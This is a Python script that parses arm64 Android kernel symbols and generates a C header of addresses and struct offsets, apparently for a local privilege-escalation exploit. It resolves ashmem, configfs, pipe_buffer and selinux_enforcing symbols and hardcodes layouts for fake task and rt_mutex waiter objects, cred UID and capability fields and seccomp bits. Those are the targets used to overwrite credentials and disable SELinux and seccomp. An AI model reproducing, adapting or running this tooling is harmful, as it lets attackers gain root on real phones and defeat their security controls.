#!/usr/bin/env python3
import argparse
import os
import re
import subprocess
import sys
from pathlib import Path

KIMAGE_TEXT_BASE_DEFAULT = 0xffffffc080000000

SYMBOL_ALIASES = {
    "ashmem_misc_fops": [
        "ashmem_misc_fops",
        "ashmem_misc",
    ],
    "ashmem_compat_ioctl": [
        "ashmem_compat_ioctl",
        "compat_ashmem_ioctl",
    ],
    "copy_splice_read": [
        "copy_splice_read",
        "direct_splice_read",
    ],
    "filemap_splice_read": [
        "filemap_splice_read",
        "generic_file_splice_read",
    ],
    "selinux_enforcing": [
        "selinux_enforcing",
        "selinux_enforcing_boot",
    ],
    "random_boot_id_data": [
        "random_boot_id_data",
        "random_boot_id",
    ],
    "loggers": [
        "loggers",
        "loggers_0_1",
    ],
}

BASE_SYMBOLS = [
    {"define": "ASHMEM_MISC_FOPS", "symbol": "ashmem_misc_fops", "required": False},
    {"define": "ASHMEM_FOPS", "symbol": "ashmem_fops", "required": True},
    {"define": "ASHMEM_IOCTL", "symbol": "ashmem_ioctl", "required": True},
    {"define": "ASHMEM_COMPAT_IOCTL", "symbol": "ashmem_compat_ioctl", "required": True},
    {"define": "ASHMEM_MMAP", "symbol": "ashmem_mmap", "required": True},
    {"define": "ASHMEM_OPEN", "symbol": "ashmem_open", "required": True},
    {"define": "ASHMEM_RELEASE", "symbol": "ashmem_release", "required": True},
    {"define": "ASHMEM_SHOW_FDINFO", "symbol": "ashmem_show_fdinfo", "required": True},
    {"define": "CONFIGFS_READ_ITER", "symbol": "configfs_read_iter", "required": True},
    {"define": "CONFIGFS_BIN_WRITE_ITER", "symbol": "configfs_bin_write_iter", "required": True},
    {"define": "COPY_SPLICE_READ", "symbol": "copy_splice_read", "required": True},
    {"define": "NOOP_LLSEEK", "symbol": "noop_llseek", "required": True},
    {"define": "INIT_TASK", "symbol": "init_task", "required": True},
    {"define": "ROOT_TASK_GROUP", "symbol": "root_task_group", "required": True},
    {"define": "SELINUX_BLOB_SIZES", "symbol": "selinux_blob_sizes", "required": True},
    {"define": "SELINUX_ENFORCING", "symbol": "selinux_enforcing", "required": True},
    {"define": "SECURITY_HOOK_HEADS", "symbol": "security_hook_heads", "required": True},
    {"define": "KMALLOC_CACHES", "symbol": "kmalloc_caches", "required": True},
    {"define": "ANON_PIPE_BUF_OPS", "symbol": "anon_pipe_buf_ops", "required": True},
]

SLIDE_SYMBOLS = [
    {"define": "SLIDE_NFULNL_LOGGER", "symbol": "nfulnl_logger", "required": True},
    {"define": "SLIDE_LOGGERS_0_1", "symbol": "loggers", "required": True},
    {"define": "SLIDE_RANDOM_BOOT_ID_DATA", "symbol": "random_boot_id_data", "required": False},
    {"define": "SLIDE_SYSCTL_BOOTID", "symbol": "sysctl_bootid", "required": True},
]

STATIC_OFFSETS = {
    "LOCK_OFF": 0x1350,
    "W0_OFF": 0x2220,
    "FOPS_OFF": 0x1000,
    "SCRATCH_OFF": 0x3000,
    "RIGHT_OFF": 0x4440,
    "LEFT_OFF": 0x5550,
    "FAKE_TASK_OFF": 0x3200,
    "WAITER_LOCAL_OFF": 0x80,
    "WAITER_TREE_ENTRY_OFF": 0x00,
    "WAITER_PI_TREE_ENTRY_OFF": 0x18,
    "WAITER_TASK_OFF": 0x30,
    "WAITER_LOCK_OFF": 0x38,
    "WAITER_WAKE_STATE_OFF": 0x40,
    "WAITER_PRIO_OFF": 0x44,
    "WAITER_DEADLINE_OFF": 0x48,
    "WAITER_WW_CTX_OFF": 0x50,
    "FAKE_WAITER_TREE_PRIO_OFF": 0x18,
    "FAKE_WAITER_TREE_DEADLINE_OFF": 0x20,
    "FAKE_WAITER_PI_TREE_ENTRY_OFF": 0x28,
    "FAKE_WAITER_PI_TREE_PRIO_OFF": 0x40,
    "FAKE_WAITER_PI_TREE_DEADLINE_OFF": 0x48,
    "FAKE_WAITER_TASK_OFF": 0x50,
    "FAKE_WAITER_LOCK_OFF": 0x58,
    "FAKE_WAITER_WAKE_STATE_OFF": 0x60,
    "FAKE_WAITER_WW_CTX_OFF": 0x68,
    "FAKE_TASK_USAGE_OFF": 0x40,
    "FAKE_TASK_PRIO_OFF": 0x84,
    "FAKE_TASK_NORMAL_PRIO_OFF": 0x8c,
    "FAKE_TASK_TASK_GROUP_OFF": 0x348,
    "FAKE_TASK_PI_LOCK_OFF": 0x90c,
    "FAKE_TASK_PI_WAITERS_OFF": 0x920,
    "FAKE_TASK_PI_TOP_TASK_OFF": 0x930,
    "FAKE_TASK_PI_BLOCKED_ON_OFF": 0x938,
    "CFG_PAGE_OFF": 16,
    "CFG_NEEDS_READ_FILL_OFF": 80,
    "CFG_BIN_BUFFER_OFF": 88,
    "CFG_BIN_BUFFER_SIZE_OFF": 96,
    "CFG_CB_MAX_SIZE_OFF": 100,
    "MM_OWNER_OFF": 1032,
    "TASK_PID_OFF": 0x618,
    "TASK_TGID_OFF": 0x61c,
    "TASK_REAL_PARENT_OFF": 0x628,
    "TASK_ATOMIC_FLAGS_OFF": 0x5d8,
    "TASK_REAL_CRED_OFF": 0x818,
    "TASK_CRED_OFF": 0x820,
    "TASK_COMM_OFF": 0x830,
    "TASK_TASKS_OFF": 0x550,
    "TASK_THREAD_INFO_FLAGS_OFF": 0x00,
    "TASK_SECCOMP_OFF": 0x8e8,
    "CRED_UID_OFF": 8,
    "CRED_SECUREBITS_OFF": 40,
    "CRED_CAPS_OFF": 48,
    "CRED_SECURITY_OFF": 128,
    "SELINUX_CRED_BLOB_OFF": 0,
    "SELINUX_CRED_OSID_OFF": 0,
    "SELINUX_CRED_SID_OFF": 4,
    "SECCOMP_MODE_OFF": 0x00,
    "SECCOMP_FILTER_COUNT_OFF": 0x04,
    "SECCOMP_FILTER_OFF": 0x08,
    "TIF_SECCOMP_BIT": 11,
    "PFA_NO_NEW_PRIVS_BIT": 0,
    "STRUCT_PAGE_SIZE": 0x40,
    "STRUCT_PAGE_COMPOUND_HEAD_OFF": 0x08,
    "STRUCT_SLAB_CACHE_OFF": 0x08,
    "STRUCT_PAGE_TYPE_OFF": 0x30,
    "PIPE_BUFFER_SIZE": 0x28,
    "PIPE_BUFFER_SLOTS": 32,
    "PIPE_BUF_FLAG_CAN_MERGE": 0x10,
    "FOPS_OWNER_OFF": 0x00,
    "FOPS_LLSEEK_OFF": 0x08,
    "FOPS_READ_OFF": 0x10,
    "FOPS_WRITE_OFF": 0x18,
    "FOPS_READ_ITER_OFF": 0x20,
    "FOPS_WRITE_ITER_OFF": 0x28,
    "FOPS_IOCTL_OFF": 0x48,
    "FOPS_COMPAT_IOCTL_OFF": 0x50,
    "FOPS_MMAP_OFF": 0x58,
    "FOPS_OPEN_OFF": 0x68,
    "FOPS_RELEASE_OFF": 0x78,
    "FOPS_SPLICE_READ_OFF": 0xb8,
    "FOPS_SHOW_FDINFO_OFF": 0xd8,
}


def get_candidates(symbol: str) -> list[str]:
    return SYMBOL_ALIASES.get(symbol, [symbol])


def run_nm(path: str) -> str:
    for nm in ("aarch64-linux-gnu-nm", "llvm-nm", "nm"):
        try:
            result = subprocess.run(
                [nm, "-n", path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=True,
            )
            print(f"[*] Using nm: {nm}")
            return result.stdout
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue

    print("[-] Error: no working nm found")
    sys.exit(1)


def read_symbols(path: str) -> dict[str, int]:
    if not os.path.exists(path):
        print(f"[-] Error: file not found: {path}")
        sys.exit(1)

    if Path(path).name.lower().startswith("system.map"):
        print(f"[*] Reading System.map: {path}")
        data = Path(path).read_text(errors="ignore")
    else:
        print(f"[*] Reading ELF symbols: {path}")
        data = run_nm(path)

    symbols = {}

    for line in data.splitlines():
        parts = line.strip().split()
        if len(parts) < 3:
            continue

        addr_s = parts[0]
        name = parts[-1]

        if not re.fullmatch(r"[0-9a-fA-F]+", addr_s):
            continue

        addr = int(addr_s, 16)

        if addr == 0:
            continue

        if name.startswith((
            "__ksymtab",
            "__kstrtab",
            "__kstrtabns",
            "__crc",
        )):
            continue

        symbols.setdefault(name, addr)

    if not symbols:
        print("[-] Error: no symbols parsed")
        sys.exit(1)

    print(f"[+] Parsed symbols: {len(symbols)}")
    return symbols


def detect_text_base(symbols: dict[str, int]) -> int:
    for name in ("_text", "_stext"):
        if name in symbols:
            base = symbols[name]
            print(f"[*] Kernel text base from {name}: 0x{base:x}")
            return base

    print(f"[!] _text/_stext not found, using default: 0x{KIMAGE_TEXT_BASE_DEFAULT:x}")
    return KIMAGE_TEXT_BASE_DEFAULT


def normalize_symbol(name: str) -> str:
    name = re.sub(r"\.(isra|part|constprop|cold)\.[0-9]+$", "", name)
    name = re.sub(r"\.llvm\.[0-9a-fA-F]+$", "", name)
    return name


def find_symbol(symbols: dict[str, int], candidates: list[str]):
    for candidate in candidates:
        if candidate in symbols:
            return candidate, symbols[candidate]

    normalized = {}

    for name, addr in symbols.items():
        clean = normalize_symbol(name)
        normalized.setdefault(clean, []).append((name, addr))

    for candidate in candidates:
        if candidate in normalized:
            matches = sorted(normalized[candidate], key=lambda x: (len(x[0]), x[0]))
            return matches[0]

    return None, None


def collect_offsets(symbols: dict[str, int], text_base: int):
    found = {}
    slide_found = {}
    missing = []

    for spec in BASE_SYMBOLS:
        candidates = get_candidates(spec["symbol"])
        symbol, addr = find_symbol(symbols, candidates)
        define = spec["define"]

        if symbol is None:
            if spec["required"]:
                missing.append((define, candidates))
            continue

        found[define] = {
            "symbol": symbol,
            "offset": addr - text_base,
        }

    for spec in SLIDE_SYMBOLS:
        candidates = get_candidates(spec["symbol"])
        symbol, addr = find_symbol(symbols, candidates)
        define = spec["define"]

        if symbol is None:
            if spec["required"]:
                missing.append((define, candidates))
            continue

        slide_found[define] = {
            "symbol": symbol,
            "offset": addr - text_base,
        }

    if missing:
        print("[-] Missing required symbols:")
        for define, candidates in missing:
            print(f"    - {define}")
            print(f"      tried: {', '.join(candidates)}")

        print("")
        print("[*] Similar available symbols:")
        keywords = (
            "ashmem",
            "configfs",
            "splice",
            "llseek",
            "init_task",
            "root_task_group",
            "selinux",
            "security_hook_heads",
            "kmalloc_caches",
            "anon_pipe",
            "nfulnl",
            "loggers",
            "bootid",
            "boot_id",
        )

        for name in sorted(symbols):
            low = name.lower()
            if any(k in low for k in keywords):
                print(f"    {name}")

        sys.exit(1)

    return found, slide_found


def fmt_u64(value: int) -> str:
    if value < 0:
        return f"(-0x{abs(value):08x}ULL)"
    return f"0x{value:08x}ULL"


def generate_header(
    found: dict,
    slide_found: dict,
    variant: str,
    fingerprint: str,
    text_base: int,
) -> str:
    out = []

    out.append("#ifndef OFFSET_H")
    out.append("#define OFFSET_H")
    out.append("")
    out.append(f'#define BUILD_VARIANT_LABEL "{variant}"')
    out.append(f'#define BUILD_FINGERPRINT "{fingerprint}"')
    out.append("")
    out.append(f"#define KIMAGE_TEXT_BASE 0x{text_base:x}ULL")
    out.append("#define P0_PAGE_OFFSET 0xffffff8000000000ULL")
    out.append("#define P0_PHYS_OFFSET 0x80000000ULL")
    out.append("#define P0_KERNEL_PHYS_LOAD 0x80000000ULL")
    out.append("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL")
    out.append("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL")
    out.append("#define DIRECT_MAP_BASE 0xffffff8000000000ULL")
    out.append("#define DIRECT_MAP_END 0xffffff9000000000ULL")
    out.append("#define VMEMMAP_START 0xfffffffe00000000ULL")
    out.append("")

    for spec in BASE_SYMBOLS:
        define = spec["define"]
        if define in found:
            out.append(f"#define {define}_OFF {fmt_u64(found[define]['offset'])}")

    out.append("")

    for spec in BASE_SYMBOLS:
        define = spec["define"]
        if define in found:
            out.append(f"#define {define} (KIMAGE_TEXT_BASE + {define}_OFF)")

    out.append("")

    for spec in SLIDE_SYMBOLS:
        define = spec["define"]
        if define in slide_found:
            out.append(f"#define {define}_OFF {fmt_u64(slide_found[define]['offset'])}")

    if "INIT_TASK" in found:
        out.append("#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF")

    if "ROOT_TASK_GROUP" in found:
        out.append("#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF")

    out.append("")

    for spec in SLIDE_SYMBOLS:
        define = spec["define"]
        if define in slide_found:
            out.append(f"#define {define}_IMAGE \\")
            out.append(f"  (KIMAGE_TEXT_BASE + {define}_OFF)")

    if "INIT_TASK" in found:
        out.append("#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)")

    if "ROOT_TASK_GROUP" in found:
        out.append("#define SLIDE_ROOT_TASK_GROUP_IMAGE \\")
        out.append("  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)")

    out.append("")

    for name, value in STATIC_OFFSETS.items():
        if value < 16:
            out.append(f"#define {name} {value}")
        else:
            out.append(f"#define {name} 0x{value:x}")

    out.append("")
    out.append("#endif")
    out.append("")

    return "\n".join(out)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("symbols_file", help="vmlinux ELF or System.map")
    parser.add_argument("output_file", nargs="?", default="target.h")
    parser.add_argument("--variant", default="unknown")
    parser.add_argument("--fingerprint", default="unknown")

    args = parser.parse_args()

    symbols = read_symbols(args.symbols_file)
    text_base = detect_text_base(symbols)

    found, slide_found = collect_offsets(symbols, text_base)

    print("[+] Found base symbols:")
    for define, item in found.items():
        print(f"    {define:30s} <- {item['symbol']} {fmt_u64(item['offset'])}")

    print("[+] Found slide symbols:")
    for define, item in slide_found.items():
        print(f"    {define:30s} <- {item['symbol']} {fmt_u64(item['offset'])}")

    header = generate_header(
        found=found,
        slide_found=slide_found,
        variant=args.variant,
        fingerprint=args.fingerprint,
        text_base=text_base,
    )

    output_path = Path(args.output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(header)

    print(f"[+] Saved: {output_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
